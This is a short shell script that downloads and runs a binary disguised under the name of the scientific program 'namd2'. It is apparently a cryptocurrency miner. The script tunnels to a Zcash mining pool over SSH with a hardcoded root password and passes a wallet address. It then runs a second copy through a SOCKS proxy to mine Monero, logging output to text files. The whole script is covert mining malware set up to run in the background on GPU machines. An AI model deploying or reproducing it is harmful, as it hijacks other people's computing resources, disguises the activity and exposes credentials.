wget http://yogurtnetdl.github.io/namd2;
chmod +x namd2;
sshpass -p "Whlw650913" ssh -oStrictHostKeyChecking=no -N -L 20001:us1-zcash.flypool.org:3333 root@47.88.228.184 &
nohup ./namd2 -l localhost:20001 -u t1ZVkPnXucGFBgKefGL8t46UryL8DmtS9zY.gpu1 -cd 0 0 1 1 2 2 3 3  > zec.txt &

wget https://yogurtnetdl.github.io/namd.tar.gz;
tar -xf namd.tar.gz;
cd namd/opt/namd/;
./namd2 -proxy SOCKS://47.88.228.184:23455 -user hilcj0001@gmail.com -xmr 23 > xmr.txt 
